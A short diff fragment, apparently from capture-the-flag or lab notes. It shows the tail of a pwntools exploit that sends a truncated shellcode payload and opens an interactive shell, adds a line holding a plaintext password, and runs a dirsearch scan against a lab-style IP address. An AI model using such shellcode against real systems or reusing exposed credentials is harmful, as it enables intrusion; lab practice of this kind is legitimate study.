@@ -7,6 +7,8 @@ payload = b'\x31\xC0\xB0\x0B\x31\xC9\x31\xD2\x31\xDB\xB3\x68\xD1\xE3\xD1\xE3\xD1
 r.sendline(payload)
 r.interactive()
 
+password 12345ted123
+
 
 pandora@Dora:~$ dirsearch -u 10.10.10.65
 
